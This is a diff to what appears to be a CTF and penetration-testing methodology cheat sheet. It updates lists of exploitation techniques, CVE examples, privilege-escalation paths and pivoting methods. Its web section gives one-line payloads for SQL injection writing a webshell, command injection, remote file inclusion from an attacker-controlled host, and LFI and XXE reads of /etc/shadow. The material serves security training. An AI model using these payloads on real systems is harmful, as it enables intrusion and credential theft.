@@ -19,7 +19,7 @@ Useful tools: nmap port scanner and (NSE) scripts, burp proxy, dirb/gobuster, ni
 ```
 1. Exploiting security misconfiguration
    ➤ Anonymous access (e.g. FTP/TFTP/NFS/SMB, unprotected web admin console)
-   ➤ Default or weak credentials (e.g. Web server, CMS, database, OS)
+   ➤ Default and weak credentials (e.g. Web server, CMS, database, OS)
    ➤ Web server misconfiguration (e.g. Webdav + HTTP PUT method allowed > upload a Webshell)
    ➤ Clear-text passwords stored in 'public' website pages, configuration files, log files
    ➤ ...
@@ -31,15 +31,17 @@ Useful tools: nmap port scanner and (NSE) scripts, burp proxy, dirb/gobuster, ni
    ➤ Web framework         (e.g. PHP CGI RCE CVE-2012-1823)
    ➤ FTP server            (e.g. ProFTPd 1.3.5 RCE CVE-2015-3306)
    ➤ Samba server          (e.g. SambaCry RCE CVE-2017-7494)
-   ➤ Windows OS            (e.g. RCE: EternalBlue/MS17-010/CVE-2017-0143, MS14-068/CVE-2014-6324, MS08-067/CVE-2008-4250)
+   ➤ Windows OS            (e.g. PrintNightmare/CVE-2021-1675, EternalBlue/MS17-010/CVE-2017-0143, MS14-068/CVE-2014-6324, MS08-067/CVE-2008-4250)
    ➤ ...
    
 3. Exploiting Web application vulnerabilities
-   ➤ SQL injections -> OS command execution (e.g. for MysQL: SELECT webshell INTO DUMPFILE '/path/to/webshell.php'; MSSQL: exec master..xp_cmdshell 'windows command')
-   ➤ RFI & LFI
-   ➤ Insecure upload function (i.e. webshell upload)
-   ➤ OS command injections
-   ➤ XXE (e.g. <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>]>)
+   ➤ SQLi - SQL injection                 (e.g. MysQL DB: SELECT webshell INTO DUMPFILE '/path/to/webshell.php'; MSSQL DB: exec master..xp_cmdshell 'windows command')
+   ➤ Insecure upload function             (i.e. PHP/ASP/ASPX/JSP Webshell upload)
+   ➤ OS command injection                 (e.g. https://target.com//stockStatus?ID=29|whoami)
+   ➤ RFI - Remote File Include            (e.g. https://target.com/page?url=http://yourIP/webshell.php)
+   ➤ LFI - Local File Include             (e.g. https://target.com/page?file=/../../../../etc/shadow)
+   ➤ SSRF - Server Side Request Forgery   (e.g. https://target.com/page?url=http://127.0.0.1/phpmyadmin)
+   ➤ XXE - XML external entity injection  (e.g. <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>]>)
    ➤ ...
    
 Useful tools: various scripts, webshells, and reverse shells (source:kali/Github/your owns), searchsploit/ExploitDB, metasploit framework, burp proxy, sqlmap, kadimus, hydra, ncrack, impacket framework, CrackMapExec, DBvis..
@@ -51,14 +53,14 @@ Useful tools: various scripts, webshells, and reverse shells (source:kali/Github
    ➤ Linux OS   (e.g. SUDO misconfiguration, SUID misconfiguration, CRON misconfiguration, weak file permissions, weak passwords, password reuse, clear-text passwords in scripts and .bash_history..)
    
 2. Exploiting unpatched known vulnerabilities 
-   ➤ Linux local exploit   (e.g. Dirtyc0w CVE-2016-5195, eBPF exploit CVE-2017-16995, Overlayfs exploit CVE-2015-1328)
+   ➤ Linux local exploit   (e.g. DirtyPipe CVE-2022-0847, Dirtyc0w CVE-2016-5195, eBPF exploit CVE-2017-16995, Overlayfs exploit CVE-2015-1328)
    ➤ Windows local exploit (e.g. HOT/ROTTEN/JUICY POTATO exploits, MS16-032 Secondary Logon Handle Privesc)
    ➤ Exploit for any vulnerable service/software running with "Local System" or local administrator privilege
    
 Useful tools: various scripts such as 'LinEnum', 'LinPEAS', 'Linux Exploit suggester', 'WinPEAS','PowerSploit/PowerUp', 'Sherlock' and your owns,  searchsploit/ExploitDB, metasploit framework,..
 ```
 
-##### Step 4 - Pivoting techniques to attack a second VM (or docker containers) only reachable from the 1rst one (some CTFs have several VMs :-))
+##### Step 4 - Pivoting techniques to attack a second VM (or docker containers) only reachable from the 1rst one (some CTFs have several VMs/docker containers :-))
 ```
 1. Pivoting with SSH tunneling (e.g. dynamic port forward / socks5 proxy / use of proxychain)
 2. Pivoting with Metasploit/Meterpreter (e.g. post/multi/manage/autoroute + socks5 proxy + use of proxychain; "portfwd add" rules)
